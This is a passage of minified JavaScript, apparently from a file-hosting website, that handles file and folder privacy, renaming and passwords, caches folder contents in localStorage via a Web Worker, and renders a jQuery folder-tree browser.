file.")},l.success=function(e){s.onSuccess&&s.onSuccess.call(i,d),d&&window.tH&&window.tH.files&&window.tH.files.Yx(d.quickkey,d),i.ato(e.response.myfiles_revision),r&&r(e)};var c=d||new tH.Cp(a);if(!c)return void l.error();s.onBefore&&s.onBefore.call(i,c),"public"==t?c.aax(l):c.aaG(l)}if(o){var f=window.tH.folders.yx(o);if(l.error=function(){window.localStorage&&localStorage.clear(),s.onError&&s.onError.call(i,f),Zi(0,"There was a problem while updating the folder.")},l.success=function(a){n&&function a(o){o.privacy=t,e.each(o.folders,(function(e,t){a(t),window.tH.folders.Yx(t.folderkey,t)})),e.each(o.files,(function(e,a){a.privacy=t,window.tH.files.Yx(a.quickkey,a),s.onSuccess&&s.onSuccess.call(i,a)})),window.tH.folders.Yx(o.folderkey,o),s.onSuccess&&s.onSuccess.call(i,o)}(f),window.tH&&window.tH.folder&&window.tH.folders.Yx(f.folderkey,f),i.ato(a.response.myfiles_revision),s.onSuccess&&s.onSuccess.call(i,f),r&&r(a)},!f)return void l.error();s.onBefore&&s.onBefore.call(i,f),"public"==t?f.aax(n,l):f.aaG(n,l)}}},asR.prototype.aal=function(t,a,o,n){var r=this,i=arguments.callee;if(r.adF()){if(r.ZR(),a){var s="There was a problem while updating the file.";if(n)l=new window.tH.Cp(a);else{var l=window.tH.files.yx(a);if(!l)return void Zi(0,s)}i.onBefore&&i.onBefore.call(r,l,t),l.Yn(t,{success:function(e){window.tH.files.Yx(l.quickkey,l),r.ato(e.response.myfiles_revision),i.onSuccess&&i.onSuccess.call(r,l,t)},error:function(e){var a;if(e&&e.responseText)try{a=JSON.parse(e.responseText)}catch(e){}else a||(a={response:{error:999}});switch(window.localStorage&&localStorage.clear(),i.onError&&i.onError.call(r,l,t),a.response.error){case 106:s="The file suffix can only be changed to another suffix that is of the same type as the original suffix.";break;case 158:s="A file with that name already exists in the destination folder";break;case 118:s='The file name should be at least 3 characters and not containing \\ / * ? " < > |';break;case 999:s="An Unknown error occured."}Zi(0,s)}})}if(o){s="There was a problem while updating the folder.";var d=window.tH.folders.yx(o);if(!d)return void Zi(0,s);i.onBefore&&i.onBefore.call(r,d,t),d.Yn(t,{success:function(a){window.tH.folders.Yx(d.folderkey,d),r.ato(a.response.myfiles_revision),i.onSuccess&&i.onSuccess.call(r,d,t),e.publish("folder/update",[d,null,!0])},error:function(e){var a;if(e&&e.responseText)try{a=JSON.parse(e.responseText)}catch(e){}switch(a||(a={response:{error:0}}),window.localStorage&&localStorage.clear(),i.onError&&i.onError.call(r,d,t),a.response.error){case 159:s="A folder with that name already exists in the destination folder";break;case 117:case 185:s="Invalid folder name"}Zi(0,s)}})}}},asR.prototype.ajl=function(e){var t=this,a=arguments.callee;t.ZR(),a.onBefore&&a.onBefore.call(t,e);var o,n=[];"object"==typeof e?n=e.files:n.push(e);for(var r=0,i=n.length;r<i;++r)(o=window.tH.files.yx(n[r]))?o.aiV({success:function(e){a.onSuccess&&a.onSuccess.call(t,o)},error:function(){window.localStorage&&localStorage.clear(),a.onError&&a.onError.call(t,o),Zi(0,"There was a problem while saving the file(s) to your account.")}}):Zi(0,"There was a problem while saving the file(s) to your account.")},asR.prototype.ahE=function(e){var t=this,a=arguments.callee;e||(e=t.atB),a.onBefore&&a.onBefore.call(t),e.Yw((function(e){"Success"==e.response.result&&(t.aTA=0==avH(e.response.user_info.options,20))})),e.acA({success:function(e){window.aaA=0,a.onSuccess&&a.onSuccess.call(t,e)},error:function(o){window.aaA<3?(window.aaA++,setTimeout((function(){t.ahE(e)}),6e4)):(clearInterval(window.aqg),window.aqg=null,a.onError&&a.onError.call(t,o),window.aqd=!0)}})},asR.prototype.agk=function(e,t){var a=this,o=arguments.callee;if(a.adF()){a.ZR();var n=window.tH.files.yx(e),r=window.tH.files.yx(t),i=r.parent;n&&r?Gm(n.filename)==Gm(r.filename)?(o.onBefore&&o.onBefore.call(a,n,r),n.agq(t,{success:function(){for(var s=Array("filename","created","privacy","size","hash"),l=0;l<s.length;l++){var d=s[l];r[d]=n[d]}i.files[r.quickkey]=r,tH.folders.Yx(i.folderkey,i),tH.files.Yx(t,r),a.ahG(e),o.onSuccess&&o.onSuccess.call(a,n,r)},error:function(){window.localStorage&&localStorage.clear(),o.onError&&o.onError.call(a,n,r),Zi(0,"There was a problem while updating the file.")}})):Zi(0,"There was a problem while updating the file.<br />Files must have the same file extension. "):Zi(0,"There was a problem while updating the file.")}},asR.prototype.agD=function(e,t){var a=this,o=arguments.callee;if(a.adF()){a.ZR();var n=window.tH.files.yx(e);n?(o.onBefore&&o.onBefore.call(a,n),n.MFAPI_UpdateFilePassword(t,{success:function(){n.password_protected=t.length>0?"yes":"no",window.tH.files.Yx(n.quickkey,n),o.onSuccess&&o.onSuccess.call(a,n)},error:function(){window.localStorage&&localStorage.clear(),o.onError&&o.onError.call(a,n),Zi(0,"There was a problem while updating the password on the file.")}})):Zi(0,"There was a problem while updating the password on the file.")}},asR.prototype.atL=function(){if(!window.tH)return!1;if(window.tH.myfiles_revision)return window.tH.myfiles_revision;if(!this.atw&&!this.aty&&window.localStorage&&localStorage.myfiles_revision){var e=JSON.parse(localStorage.myfiles_revision);if(window.tH.myfiles_revision=e,sizeOf(e))return e}return!1},asR.prototype.ato=function(e){e instanceof Object&&e.epoch&&e.revision&&(window.tH.myfiles_revision=e,this.atw||this.aty||(localStorage.myfiles_revision=JSON.stringify(e)))}}(jQuery),jQuery,auV=function(e,t,a,o,n){var r=this;r.aue=e||[],r.atT=t||function(){},r.atE=a||1e3,r.auf=o||10,r.aud=0,r.aum="",r.atQ=null,r.auW=n||!1},auV.prototype.atR=function(){var e=this;return!!e.atE&&(e.auW?e.atQ=setTimeout((function(e){e.atD()}),e.atE,e):e.atQ=setInterval((function(e){e.atD()}),e.atE,e),!0)},auV.prototype.atD=function(){var e=this;e.aum.length||e.aud>=e.auf||!e.aue||0==e.aue.length?e.auW?clearTimeout(e.atQ):clearInterval(e.atQ):(e.aud+=1,e.atT(e.aue),e.auW&&(e.atQ=setTimeout((function(e){e.atD()}),e.atE,e)))},auV.prototype.atm=function(){var e=this;e.aum="stop",e.auW?clearTimeout(e.atQ):clearInterval(e.atQ),e.atD=function(){},e.atR=function(){return!1}},function(e){function t(e){return"function"==typeof e?e:e&&e.success&&"function"==typeof e.success?e.success:function(){}}function a(e){return e&&e.error&&"function"==typeof e.error?e.error:function(){}}function o(t,a){if(t||(t=window.tH.folders.yx(a.folderkey)),a&&a.response&&a.response.folder_info){a.etag&&(t.etag=a.etag);var o=a.response.folder_info;null===t.name&&(t.name="UNKNOWN FOLDER"),a.flag&&(a.shared=1!=avH(a.flag,1)||SHARED?"yes":"no"),e.each(o,(function(e,a){"files"!=e&&"folders"!=e&&(t[e]=a)})),t.folders={},t.files={}}return t}function n(t,a){var o=[];return a&&a.response.folder_content&&(aFb=a.response.folder_content,e.each(aFb,(function(e,a){"files"!=e&&"folders"!=e&&"content_type"!=e&&"chunk_size"!=e&&t[e]&&(t[e]=a)})),(aFb.folders&&aFb.folders.length>0||aFb.files&&aFb.files.length>0)&&(aFb.folders&&(e.each(aFb.folders,(function(e,a){a.flag&&(aFb.folders[e].shared=1!=avH(a.flag,1)||SHARED?"yes":"no"),SHARED||"yes"!=t.shared&&"child"!=t.shared||(aFb.folders[e].shared="child",aFb.folders[e].owner_name=t.owner_name),aFb.folders[e].parent_chunk=aFb.chunk_number,o.push(aFb.folders[e])})),t.Yy(aFb,!1,!1),"yes"!=aFb.more_chunks?t.folders_loaded=!0:t.folders_loaded=!1),aFb.files&&(e.each(aFb.files,(function(e,t){aFb.files[e].parent_chunk=aFb.chunk_number,o.push(aFb.files[e])})),t.ZW||(t=new tH.yJ(t)),t.ZW(aFb.files),"yes"!=aFb.more_chunks?t.files_loaded=!0:t.files_loaded=!1)),aFb[aFb.content_type]&&0!=aFb[aFb.content_type].length||(t[aFb.content_type+"_loaded"]=!0),aFb.content_type&&aFb.chunk_number&&(t[aFb.content_type+"_chunk"]=aFb.chunk_number)),{folder:t,items:o}}aHE=function(e,t,a,o){var n=this;n.aJL=e||null,n.aJu=!0,n.aJW=a||!1,n.aOQ=o||1123220;try{n.aKA="localStorage"in window&&null!==window.localStorage}catch(e){n.aKA=!1}n.aJI=n.aJL&&!n.aJu&&!n.aJW&&n.aKA,n.aGF=null,window.Worker&&JS_LoadTime&&(n.aGF=new Worker(sCDNUrl+"/js/ww_cache_folders_"+JS_LoadTime+".js"),n.aIJ())},aJK={},aHE.prototype.aJg=function(){var e=this;if(localStorage){var t=[];if("Internet Explorer"===BrowserName()&&"8"===Bm()[0]||!Object.keys)for(member in window.localStorage)t.push(member);else t=Object.keys(localStorage);for(var a=0,o=t.length;a<o;a++){var n=t[a],r=n.split("-");r[0]==e.aJL&&e.aGF&&e.aGF.postMessage({cmd:"parse-data",key:n,params:localStorage[n]}),r[0]!=e.aJL&&"FOLDERCONTENT"==r[1]&&localStorage.clear()}}},aHE.prototype.aIJ=function(){var e=this;e.aGF.onmessage=function(a){var r={};if(a.data.key&&aJK&&(r=aJK[a.data.key]),r)var i=r.folder;if(window.tH&&window.tH.aQQ(),a.data.value&&a.data.value.expires){var s=new Date,l=new Date(a.data.value.expires),d=a.data.message.split("-");"found"==d[1]&&s>l&&(a.data.message=d[0]+"-not-found")}switch(a.data.message){case"content-found":var c=n(i,a.data.value);i=c.folder;var f=c.items;e.aJP(i,f,a.data.value,!0,r.callbacks,a.data.key,r.options);break;case"content-not-found":e.aGU(i,r.options,r.callbacks,!1,!0);break;case"info-found":i=o(i,a.data.value),r.callback&&("function"==typeof r.callback?r.callback(i):r.callback.success&&r.callback.success(i));break;case"info-not-found":e.aLI(i,r.callback,!0);break;case"search-found":t(r.callbacks).call(this,a.data.value);break;case"search-not-found":e.aGY(i,r.searchterm,r.searchall,r.filter,r.callbacks,!0);break;case"depth-found":t(r.callbacks).call(this,a.data.value);break;case"depth-not-found":e.aLA(i,r.callbacks,!0)}}},aHE.prototype.aJo=function(e,t){var a=this,o=null;return localStorage&&localStorage.user&&localStorage.user!=a.aJL&&(a.aJL=localStorage.user),t?e&&(o=a.aJL+"-"+e+"-"+t):o=a.aJL+"-"+e,o},aHE.prototype.aIZ=function(t,a){if(!this.aJI)return!1;window.tH&&window.tH.aQQ();var o,n=t?this.aJo(t,a):a;if(localStorage[n]){var r=(o=localStorage[n],e.parseJSON(o));return r.expires?!(new Date>new Date(r.expires))&&r:r}return!1},aHE.prototype.aJq=function(e,t){var a=this,o=e?a.aJo(e,t):t;a.aGF&&a.aGF.postMessage({cmd:"remove-data",key:o}),localStorage&&localStorage[o]&&localStorage.removeItem(o)},aHE.prototype.aJB=function(e,t,a){var o=this,n=new Date;n.setSeconds(n.getSeconds()+o.aOQ);var r=n;a.expires=r;var i,s=o.aJo(e,t),l=(i=a,JSON.stringify(i,(function(e,t){return"number"==typeof t?String(t):t})));return o.aGF&&o.aGF.postMessage({cmd:"parse-data",key:s,params:l}),!!o.aJI&&(localStorage[s]=l,!!localStorage[s])},aHE.prototype.aJP=function(a,o,n,r,i,s,l){a.folders||(a.folders={}),a.files||(a.files={});var d=[];e.each(o,(function(e,t){if(t.parent_chunk&&t.parent_chunk,t.folderkey){var o;"myfiles"!=t.folderkey?(o=new window.tH.yJ(t,a)).parent=a:o=new window.tH.yJ(t),window.tH.folders.Yx(o.folderkey,o),"myfiles"!=t.folderkey&&d.push(o)}else{var n=new window.tH.Cp(t,a);n.parent=a,window.tH.files.Yx(n.quickkey,n),d.push(n)}}));var c=-1!=n.response.action.indexOf("device/get_trash"),f=c?parseInt(n.response.chunk_size):parseInt(n.response.folder_content.chunk_size),u=c?o.length<f:"yes"!=n.response.folder_content.more_chunks;a.status||(a.status={}),a.status[l.data.filter]||(a.status[l.data.filter]={}),a.status[l.data.filter][l.data.order_by]||(a.status[l.data.filter][l.data.order_by]={}),a.status[l.data.filter][l.data.order_by][l.data.order_direction]||(a.status[l.data.filter][l.data.order_by][l.data.order_direction]={files:{},folders:{}}),a.status[l.data.filter][l.data.order_by][l.data.order_direction][l.data.content_type]||(a.status[l.data.filter][l.data.order_by][l.data.order_direction][l.data.content_type]={}),a.status[l.data.filter][l.data.order_by][l.data.order_direction][l.data.content_type].chunk=l.data.chunk?l.data.chunk:1,a.status[l.data.filter][l.data.order_by][l.data.order_direction][l.data.content_type].loaded=!!n.response&&u,window.tH.root||"myfiles"!=a.folderkey||(window.tH.root=a),"myfiles"==a.folderkey&&(a.name="My Files"),a.parent||a.parent_folderkey||(a.parent_folderkey="myfiles"),r||this.aJB("FOLDERCONTENT",s,n),t(i).call(this,a,d)},aHE.prototype.aGU=function(t,o,r,i,s){var l=this;if(t.name){var d=i||!1,c=(o=e.extend(!0,{data:{content_type:"folders",filter:"",order_by:"name",order_direction:"asc",chunk:1}},o)).data.content_type||"folders",f=o.data.filter||"all",u=o.data.order_by||"name",p=o.data.order_direction||"asc",h=o.data.chunk||1,m=t.folderkey+"-"+c+"-"+f+"-"+u+"-"+p+"-"+h,g={},y=function(e,t,a,o,n){l.aJP(e,t,a,o,r,m,n)};if(!l.aGF||s||i)if(d||!1===(g=l.aIZ("FOLDERCONTENT",m)))t.aEn||(t=new tH.yJ(t.folderkey)),t.aEn(o,{success:function(e,t,a){y(e,t,a,!1,o)},error:a(r)},1);else{var v,w=n(t,g);t=w.folder,v=w.items,y(t,v,g,!0,o)}else{var b=l.aJo("FOLDERCONTENT",m);aJK[b]={folder:t,options:o,callbacks:r},l.aGF.postMessage({cmd:"request-data",key:b,prefix:"content"})}}else l.aLI(t,{success:function(n){if("myfiles"==n.name&&(n.name="My Files"),delete t.folders,delete t.files,!o.data.chunk||1==o.data.chunk){var i=window.tH.folders.yx(t.folderkey);i&&(i.folders&&e.each(i.folders,(function(e,t){window.tH.folders.abg(t.folderkey)})),i.files&&e.each(i.files,(function(e,t){window.tH.files.abg(t.quickkey)})),window.tH.folders.memory[i.folderkey].files={},window.tH.folders.memory[i.folderkey].folders={})}if(!t.shared&&0===avH(n.flag,1))return window.location="/?"+n.folderkey,!1;l.aJi||"yes"!=n.shared&&"child"!=n.shared?l.aGU(n,o,r):(a(r).call(),window.location.hash="myfiles")},error:a(r)})},aHE.prototype.aLI=function(e,n,r,i){var s=this;if(s.aGF&&!r){var l=s.aJo("FOLDERINFO",e.folderkey);aJK[l]={folder:e,callback:n},s.aGF.postMessage({cmd:"request-data",key:l,prefix:"info"})}else!1!==(aJS=s.aIZ("FOLDERINFO",e.folderkey))?(e=o(e,aJS),t(n).call(this,e)):(e instanceof tH.yJ==!1&&(e=new tH.yJ(e.folderkey)),e.Yw({data:{recursive:"no",start:"1",limit:"1"}},{success:function(a){a.etag=e.etag,s.aJB("FOLDERINFO",e.folderkey,a),t(n).call(this,e)},error:a(n)}))},aHE.prototype.aGY=function(e,o,n,r,i,s){var l=this,d=e.folderkey+"-"+o;if(!l.aGF||s||n)if(!1===(aIR=l.aIZ("SEARCH",d))||n){var c={data:{search_text:o,version:2.5}};"myfiles"!=e.folderkey&&""!=e.folderkey&&(c.data.folder_key=e.folderkey),n&&(c.data.search_all="yes",c.data.folder_key=""),r&&(c.data.filter=r),e.aFG(c,{success:function(e){e.response.results.length>0&&!c.data.search_all&&l.aJB("SEARCH",d,e),t(i).call(this,e)},error:a(i)})}else t(i).call(this,aIR);else{var f=l.aJo("SEARCH",e.folderkey);aJK[f]={folder:e,searchterm:o,searchall:n,filter:r,callbacks:i},l.aGF.postMessage({cmd:"request-data",key:f,prefix:"search"})}},aHE.prototype.aLA=function(e,o,n){var r=this,i=e.folderkey;if(r.aGF&&!n){var s=r.aJo("DEPTH",e.folderkey);aJK[s]={folder:e,callbacks:o},r.aGF.postMessage({cmd:"request-data",key:s,prefix:"depth"})}else!1!==(aKK=r.aIZ("DEPTH",i))?t(o).call(this,aKK):e.aHV({success:function(e){r.aJB("DEPTH",i,e),t(o).call(this,e)},error:a(o)})},aHE.prototype.aIX=function(e){var t=this,a=[];if(t.aGF&&t.aGF.postMessage({cmd:"uncache-folder",folderkey:e}),localStorage){if("Internet Explorer"===BrowserName()&&"8"===Bm()[0]||!Object.keys)for(member in window.localStorage)a.push(member);else a=Object.keys(localStorage);if(a&&a.length>0)for(var o=0;o<a.length;o++){var n=a[o];if(n){var r=n.split("-");r[0]==t.aJL&&r[2]==e&&t.aJq(!1,n)}}}}}(jQuery),function(e){var t,a;function o(o,n,r){for(bdn in a=void 0!==r&&1==r,"string"==typeof n&&(t=n),this.bbU={},this.aQm={},this.aab={container_selector:"#folderTree .folderlist_content",folder_browser_class:"",current_folder_class:"current_folder_location",expanded_folder_class:"expanded",collapsed_folder_class:"collapsed",linked_folder_class:"linked_folder",shared_by_folder_class:"sharedByUser",add_arrow:!0,display_linked_folders:!0,onFolderDrop:function(){},onFolderContextMenu:function(){},onFolderClick:function(){},onFolderMouseDown:function(){},onArrowClick:function(){},onFolderDragOver:function(){},onFolderDragStart:function(){},onFolderDragEnd:function(){},onFolderDragEnter:function(){},onFolderDragLeave:function(){},onFolderBrowserLoad:function(){},onFolderAdd:function(){}},o)void 0!==this.aab[bdn]&&(this.aab[bdn]=o[bdn]);this.baB=e(this.aab.container_selector),bdV.push(this)}function n(t,a){t.folderkey&&a.baB.find("#mffb-"+t.folderkey).length>0&&a.baB.find("#mffb-"+t.folderkey+" > ul").length>0&&0==a.baB.find("#mffb-"+t.folderkey+" > ul > li > a.load_more").length&&a.baB.find("#mffb-"+t.folderkey+" > ul").append(e("<li class='load_more_folders'></li>").html("<a href='javascript:void(0)' class='load_more'>Load More&hellip;</a>").data("key",t.folderkey))}function r(e){var t,o,n={avatar:"",chunk_number:0,created:"",file_count:"0",finished_loading:!1,flag:"2",folder_count:0,folders:new Array,folderkey:"",name:"untitled",owner_name:"",privacy:"public",shared:"no"};for(bcg in n)void 0!==e[bcg]?this[bcg]=e[bcg]:this[bcg]=n[bcg];if(this.folders&&"[object Array]"!==Object.prototype.toString.call(this.folders)){var i=this.folders;for(var s in this.folders=new Array,i)this.folders.push(new r(s));this.folders.sort((function(e,t){var a=e.name.toLowerCase(),o=t.name.toLowerCase();return a<o?-1:a>o?1:0}))}e.parent&&!e.parent instanceof r&&(e.parent.folders=new Array,this.parent=new r(e.parent)),a||0!=(t=this.flag,o=1,(parseInt(t)>>parseInt(o))%2)||"myfiles"==this.folderkey||(this.shared="yes"),void 0!==e.permissions&&(this.permissions=e.permissions),void 0!==e.shared_by_user&&(this.shared_by_user=e.shared_by_user)}o.prototype.acI=function(e,t,a){var o=this;a||"function"!=typeof t||(a=t),a||t||"function"!=typeof e||(a=e);var n="trash"==t;e&&"string"==typeof e||(e="myfiles"),t&&"string"==typeof t&&!n||(t=e),this.bby=e,this.bcD=t,this.beI(e,(function(e){o.bbU=e,o.bcE(e),o.beT(),o.aZC(e.folderkey,(function(){o.aQm[t]?o.aZC(t,(function(){n||o.bau(t)})):new r({folderkey:t}).bdQ(e.folderkey,(function(e){o.bdS(e,(function(){n||o.bau(t)}))}))})),o.bfd(),a&&a(o),o.aab.onFolderBrowserLoad()}))},o.prototype.bcE=function(e){for(ben in this.aQm[e.folderkey]=new r(e),e.folders)this.bcE(e.folders[ben])},o.prototype.beI=function(e,a){var o;if(e)if("myfiles"!=e||t)this.aQm[e]?(o=this.aQm[e]).bcc((function(e,t){a&&a(e,t)})):(o=new r({folderkey:e})).bep((function(){o.bcc((function(e,t){a&&a(e,t)}))}));else try{console.error("can't load myfiles without session token")}catch(e){}else try{console.error("required folderkey is missing")}catch(e){}},o.prototype.bdS=function(e,t){var a=this;if(e.length>0){var o=0;!function n(){var r=e[o];a.aZC(r.folderkey,(function(){o++,e[o]?n():t&&t()}))}()}else t&&t()},o.prototype.beT=function(){if(this.bbU){var t=e("<ul></ul>"),a=this.bdK(this.bbU);t.append(a),this.baB.html(t)}},o.prototype.aVb=function(t){if(this.aQm[t]){var a=this.aQm[t];if(a.parent){a.parent=new r(a.parent);for(var o=0,n=a.parent.folders.length;o<n;o++)if(a.parent.folders[o].folderkey==t){a.parent.folders.splice(o,1);break}a.parent.folder_count=a.parent.folders.length,this.baB.find("#mffb-"+a.parent.folderkey+" > ul > li").length<2&&(a.parent.folder_count=0),this.aQm[a.parent.folderkey]=new r(a.parent),this.bew(a.parent)}delete this.aQm[t]}void 0!==t&&t&&this.baB.find("#mffb-"+t).length>0&&this.baB.find("#mffb-"+t).remove(),a&&a.parent&&0==this.baB.find("#mffb-"+a.parent.folderkey+" > ul > li").length&&this.baB.find("#mffb-"+a.parent.folderkey+" > ul").remove(),e("a.folder_arrow").each((function(t,a){var o=e(a).parent(),n=o.data("info");n&&parseInt(n.folder_count,10)||(e(a).remove(),o.find("ul").remove())}))},o.prototype.bew=function(e){var t=this.baB.find("#mffb-"+e.folderkey);if(t.length){var a=t.children("a.folder_arrow");a.length?e&&parseInt(e.folder_count,10)||a.remove():this.aab.add_arrow&&e&&parseInt(e.folder_count,10)>0&&t.prepend('<a href="javascript:void(0)" class="folder_arrow"></a>')}},o.prototype.aZE=function(t){if(t.folderkey&&this.aQm[t.folderkey]){t.name&&t.name!=this.aQm[t.folderkey].name&&(this.aQm[t.folderkey].name=t.name,e("#mffb-"+t.folderkey).length>0&&e("#mffb-"+t.folderkey+" .folder_name").first().text(t.name));var a=this.aQm[t.folderkey];t&&a&&t.folder_count!=a.folder_count&&(this.aQm[t.folderkey].folder_count=Math.max(0,parseInt(t.folder_count,10)||0),this.bew(this.aQm[t.folderkey]))}},o.prototype.aVp=function(t,a,o){if(this.aQm[a]&&t.folderkey){var n=new r(t),i=this.aQm[a];if("yes"!=n.shared||"yes"!=i.shared&&"child"!=i.shared||(n.shared="child"),("yes"==n.shared||"child"==n.shared)&&0==this.aab.display_linked_folders)if(2!=d(n))return;if(i.chunk_number>0){n.parent=this.aQm[a],this.aQm[n.folderkey]=n,function(e,t){var a=!1;if(e&&e.folderkey&&t&&t.length>0)for(var o=0,n=t.length;o<n;o++)t[o].folderkey&&e.folderkey==t[o].folderkey&&(a=!0);return a}(n,this.aQm[a].folders)||this.aQm[a].folders.push(n),this.aQm[a].folder_count=this.aQm[a].folders.length,this.aQm[a].folders.sort((function(e,t){var a=e.name.toLowerCase(),o=t.name.toLowerCase();return a<o?-1:a>o?1:0}));var s=null;if(0==this.baB.find("#mffb-"+a+" > ul").length&&this.baB.find("#mffb-"+a).append(e("<ul></ul>")),this.aab.add_arrow&&0==this.baB.find("#mffb-"+a+" > a.folder_arrow").length&&this.baB.find("#mffb-"+a).prepend(e('<a href="javascript:void(0)" class="folder_arrow"></a>')),o)this.baB.find("#mffb-"+a+" > ul").append(this.bdK(n));else for(var l=0,c=this.aQm[a].folders.length;l<c;l++)this.aQm[a].folders[l].folderkey==n.folderkey&&0==this.baB.find("#mffb-"+a).find("#mffb-"+n.folderkey).length&&(s&&this.baB.find("#mffb-"+s).length>0?l+1<this.aQm[a].folders.length||this.aQm[a].finished_loading?this.baB.find("#mffb-"+s).after(this.bdK(n)):this.aQm[a].folders.splice(l,1):0==this.baB.find("#mffb-"+n).length&&this.baB.find("#mffb-"+a+" > ul").prepend(this.bdK(n))),this.aQm[a].folders[l]&&(s=this.aQm[a].folders[l].folderkey)}else this.aQm[a].folder_count=(parseInt(this.aQm[a].folder_count,10)||0)+1,this.aab.add_arrow&&0==this.baB.find("#mffb-"+a+" > a.folder_arrow").length&&this.baB.find("#mffb-"+a).removeClass("expanded").addClass("collapsed").prepend(e('<a href="javascript:void(0)" class="folder_arrow"></a>'));this.aab.onFolderAdd(n)}},o.prototype.bdK=function(t){var a=e("<li></li>").addClass(this.aab.collapsed_folder_class);if("yes"!=t.shared&&"child"!=t.shared||a.addClass(this.aab.linked_folder_class),t.shared_by_user&&a.addClass(this.aab.shared_by_folder_class),a.data("info",t).data("folderkey",t.folderkey).attr("id","mffb-"+t.folderkey).html('<a href="javascript:void(0)" class="folder_name" title="'+t.name.replace(/"/g,"''")+'">'+t.name.replace(/&/g,"&amp;").replace(/</g,"&lt;")+"</a>"),t.folders.length>0){for(var o=e("<ul></ul>"),n=0;n<t.folders.length;n++){var r=t.folders[n].shared;if("yes"==r||"child"==r)if(d(t.folders[n]))iPermissions=d(t.folders[n]);else{for(var i=t.folders[n],s=i.shared;"child"==s;)s=(i=i.parent).shared;iPermissions=d(i)}("yes"==r||"child"==r)&&("yes"!=r&&"child"!=r||1!=this.aab.display_linked_folders&&2!=iPermissions)||o.append(this.bdK(t.folders[n]))}a.append(o)}return this.aab.add_arrow&&((parseInt(t.folder_count,10)||0)>1||t.folders.length)&&a.prepend(e('<a href="javascript:void(0)" class="folder_arrow"></a>')),a},o.prototype.bfd=function(){var t=this;this.baB.delegate("a.folder_name","click",(function(a){var o=e(this).closest("li").data("info");return e(this).hasClass(t.aab.current_folder_class)?t.beD(o.folderkey,(function(){})):t.aZC(o.folderkey,(function(){t.bau(o.folderkey)})),t.aab.onFolderClick(a,t.aQm[o.folderkey],this),!1})).delegate("a.folder_name","mousedown",(function(a){var o=e(this).closest("li").data("info");t.aab.onFolderMouseDown(a,t.aQm[o.folderkey],this)})).delegate("a.folder_name","dragover",(function(a){var o=e(this).closest("li").data("info");return t.aab.onFolderDragOver(a,t.aQm[o.folderkey],this),!1})).delegate("a.folder_name","dragstart",(function(a){var o=e(this).closest("li").data("info");t.aab.onFolderDragStart(a,t.aQm[o.folderkey],this)})).delegate("a.folder_name","dragend",(function(a){var o=e(this).closest("li").data("info");return t.aab.onFolderDragEnd(a,t.aQm[o.folderkey],this),!1})).delegate("a.folder_name","dragenter",(function(a){var o=e(this).closest("li").data("info");return t.aab.onFolderDragEnter(a,t.aQm[o.folderkey],this),!1})).delegate("a.folder_name","dragleave",(function(a){var o=e(this).closest("li").data("info");return t.aab.onFolderDragLeave(a,t.aQm[o.folderkey],this),!1})).delegate("a.folder_arrow","click",(function(a){var o=e(this).closest("li").data("info");return t.beD(o.folderkey),t.aab.onArrowClick(a,t.aQm[o.folderkey],this),!1})).delegate("a.load_more","click",(function(a){var o=e(this).closest("li");e(this).text("Loading..."),o.addClass("loading");var n=e(this).closest("li").closest("ul").closest("li").data("info");t.aQm[n.folderkey].bcc((function(e,a){o.remove(),t.bdU(e,a)}))})).delegate("li","drop",(function(a){var o=e(this).data("info");return t.aab.onFolderDragLeave(a,t.aQm[o.folderkey],e(this).find("a.folder_name")[0]),t.aab.onFolderDrop(a,t.aQm[o.folderkey],this),!1})).delegate("li","contextmenu",(function(a){var o=e(this).data("info");return t.aab.onFolderContextMenu(a,t.aQm[o.folderkey],this),!1}))},o.prototype.bdU=function(e,t){if(e&&e.folderkey)for(var a=0,o=t.length;a<o;a++){var r=t[a];this.aVp(r,e.folderkey,!0)}e.finished_loading||n(e,this)},o.prototype.bau=function(e){this.baB.find("#mffb-"+e).length>0&&(this.baB.find("li").removeClass(this.aab.current_folder_class),this.baB.find("#mffb-"+e).addClass(this.aab.current_folder_class))},o.prototype.bfg=function(){this.baB.find("li").removeClass(this.aab.current_folder_class)},o.prototype.aZC=function(e,t){var a=this,o=this.aQm[e];function r(e){var o=!1;return e.folderkey&&a.baB.find("#mffb-"+e.folderkey).length>0&&!a.baB.find("#mffb-"+e.folderkey).hasClass(a.aab.expanded_folder_class)&&(a.baB.find("#mffb-"+e.folderkey).removeClass(a.aab.collapsed_folder_class).addClass(a.aab.expanded_folder_class),e.finished_loading||n(e,a),void 0!==e.parent&&a.aZC(e.parent.folderkey),o=!0),t&&t(),"function"==typeof MYF_fHideSpinner&&MYF_fHideSpinner("folders"),o}!o||(parseInt(o.folder_count,10)||0)>0&&0==o.folders.length?this.beI(e,(function(e,t){r(e)&&(a.bcE(e),a.bdU(e,t))})):(r(o),"function"==typeof MYF_fHideSpinner&&MYF_fHideSpinner("folders"))},o.prototype.bej=function(e){this.baB.find("#mffb-"+e).length>0&&this.baB.find("#mffb-"+e).removeClass(this.aab.expanded_folder_class).addClass(this.aab.collapsed_folder_class)},o.prototype.beD=function(e,t){this.baB.find("#mffb-"+e).length>0&&(this.baB.find("#mffb-"+e).hasClass(this.aab.expanded_folder_class)?(this.bej(e),t&&t()):this.aZC(e,t))},o.prototype.bfx=function(e){e&&(t=e)},r.prototype.bep=function(e){var t=this;l({url:"1.4/folder/get_info.php",data:{folder_key:this.folderkey},success:function(a){for(bcg in t)void 0!==a.response.folder_info[bcg]&&(t[bcg]=a.response.folder_info[bcg]);"myfiles"==t.folderkey&&(t.name="My Files"),e&&e(t)},error:function(e){}},this)},r.prototype.bdQ=function(e,t){t||"function"!=typeof e||(t=e,e=null);var a={folder_key:this.folderkey};e&&(a.root_folderkey=e),l({url:"1.4/folder/get_depth.php",data:a,success:function(e){e.response&&e.response.folder_depth&&e.response.folder_depth.chain_folders?t&&t(e.response.folder_depth.chain_folders.reverse()):t&&t(e)},error:function(e){}},this)},r.prototype.bcc=function(e){var t=this;l({url:"1.4/folder/get_content.php",data:{folder_key:this.folderkey,chunk:this.chunk_number+1,content_type:"folders"},success:function(a){var o=new Array;if(a.response&&a.response.folder_content&&a.response.folder_content.folders){"1"==a.response.folder_content.chunk_number?(t.folders=new Array,t.chunk_number=1):a.response.folder_content.chunk_number&&(t.chunk_number=parseInt(a.response.folder_content.chunk_number));for(var n=a.response.folder_content.folders.length,i=0;i<n;i++){var s=new r(a.response.folder_content.folders[i]);s.parent=t,t.folders.push(s),o.push(s)}"yes"!=a.response.folder_content.more_chunks&&(t.finished_loading=!0)}e&&e(t,o)},error:function(e){}},this)};var i=!1,s=new Array;function l(e,a){if(!i||a){i=!0;var o=function(){"undefined"==typeof XMLHttpRequest&&(XMLHttpRequest=function(){try{return new 